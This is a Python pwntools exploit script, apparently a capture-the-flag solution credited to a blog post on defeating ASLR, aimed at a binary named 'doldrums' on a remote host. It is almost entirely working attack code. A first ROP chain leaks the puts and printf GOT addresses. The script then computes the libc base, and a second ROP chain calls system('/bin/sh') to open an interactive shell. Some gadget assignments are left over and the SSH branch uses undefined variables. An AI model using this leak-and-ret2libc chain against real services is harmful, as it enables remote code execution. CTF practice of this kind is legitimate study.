#### from https://sidsbits.com/Defeating-ASLR-with-a-Leak/
####
import argparse
from pwn import *
# context.terminal = ['tmux', 'splitw', '-h']
context.defaults['encoding'] = 'utf-8'
# cmdline argument - how to connect to binary
parser = argparse.ArgumentParser()
parser.add_argument("--local", help="Run exploit locally", action="store_true")
parser.add_argument("--attach", help="Run exploit locally and attach debugger", action="store_true")
parser.add_argument("--remote", help="Run exploit on remote service", action="store_true")
parser.add_argument("--ssh", help="Run exploit on SSH server", action="store_true")
args = parser.parse_args()

# GDB commands
debugging = False
gdb_cmd = [
	"c"
]

# Binary names
bin_fname = './doldrums'

# Remote
IP = '46.101.107.117'
PORT = 2113

# Create ELF objects
e = ELF(bin_fname)
libc = ELF('libc6-i386_2.27-3ubuntu1.4_amd64.so')
x64 = e.bits != 32

# Command line args
# e.g. arg1 = cyclic_find('ahaa') * 'a' + '\xbd\x86\x04\x08' + 'a' * 4 + p32(next(e.search('/bin/sh')))
arg1 = ''
proc_args = [bin_fname, arg1]

if args.remote:
	p = remote(IP, PORT)
elif args.local or args.attach:
	p = process(proc_args)
	if args.attach:
		gdb.attach(p, gdbscript="\n".join(gdb_cmd))
elif args.ssh:
	s = ssh(host=URL, user=username, password=password)
	s.set_working_directory(bin_abs_path)
	p = s.process(proc_args)
else:
	p = gdb.debug(proc_args, gdbscript="\n".join(gdb_cmd))
	debugging = True

"""
	Exploit

	Examples:
	func_offset = libc.symbols['puts'] 	# Offset in libc
	puts_addr = p32(e.got['puts'])
	main = e.symbols['main']
	addr_string = next(e.search('/bin/cat flag.txt'))
"""

# Use the below to find the offset of the saved instruction pointer
# p.sendline(cyclic(100, n=4))
# p.interactive()

# Begin actual exploit
shell = 0x67bdf # Condition: eax = NULL, ESI = GOT of libc
shell = 0x6739f # Condition: eax = NULL, ESI = GOT of libc
# 0xcf759 execve("/bin/sh", rsi, [rax])
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [[rax]] == NULL || [rax] == NULL
cat = 0x0804888d
shell = 0xcf759 # Condition: eax = NULL, ESI = GOT of libc
main = 0x080485e6 # main is not known (obfuscated)
xor_eax = 0x080486cd
pop_esi = 0x080486cb
off_str_bin_sh = 0x11442f
# Receive "Remote debugging". Only do this if using GDB
if debugging:
	log.info(p.recvline())

# Receive "Enter your Payload!"
print(p.recvuntil(b'Please press a key to continue!\n\n'))

# p.sendline(cyclic(200, n=8 if x64 else 4))
# p.interactive()

# Send payload one to leak address
rop = ROP(bin_fname)
rop.raw(cyclic(cyclic_find('aaae', n=4), n=4))
rop.call(e.plt['puts'], [cat])
rop.call(e.plt['puts'], [e.got['puts']])
rop.call(e.plt['puts'], [cat])
rop.call(e.plt['puts'], [e.got['printf']])
# rop.call(e.plt['puts'], [cat])
# rop.call(e.plt['puts'], [e.got['system']])
rop.call(main)
p.sendline(rop.chain())
print(rop.chain())

# with open('payload', 'wb') as pay:
#     pay.write(buf)

# Add code to skip the "poem"
tmp = p.recvuntil(b'Ancient_Mariner\n\n')
# Receive the echoed payload (until the first null byte, since printf stops there)
# print(p.recvn(buf.index(b'\x00')))
# print(p.recvn(2))

# print(tmp)
# Receive the GOT address of puts
tmp = p.recvuntil(b'/bin/cat ./heading\n')
leaked_puts = u32(p.recv(4))
log.info('the leaked address of puts  : %s' % hex(leaked_puts))
# Receive the GOT address of printf
tmp = p.recvuntil(b'/bin/cat ./heading\n')
leaked_printf = u32(p.recv(4))
log.info('the leaked address of printf: %s' % hex(leaked_printf))
# Receive the GOT address of system
# tmp = p.recvuntil(b'/bin/cat ./heading\n')
# leaked_system = u32(p.recv(4))
# log.info('the leaked address of system: %s' % hex(leaked_system))

# Compute libc base
libc_base = leaked_printf - libc.symbols['printf']
log.info('the leaked of libc base     : %s' % hex(libc_base))
libc_base = leaked_puts - libc.symbols['puts']
log.info('the leaked of libc base     : %s' % hex(libc_base))
log.info('offset diff puts  : %s' % hex(leaked_puts - libc_base))
log.info('offset diff printf: %s' % hex(leaked_printf - libc_base))
# log.info('offset diff system: %s' % hex(leaked_system - libc_base))
# Receive "Enter your Payload!"
# print(p.recvline())

# Send payload two
log.info("preparing second payload")
rop2 = ROP(bin_fname)
rop2.raw(cyclic(cyclic_find('aaae', n=4), n=4))
rop2.call(e.plt['system'], [leaked_puts + off_str_bin_sh])
print(p.recvuntil(b'Please press a key to continue!\n\n'))

p.sendline(rop2.chain())
log.info("second payload sent")

print(p.recvuntil(b'Ancient_Mariner\n\n'))

p.interactive()
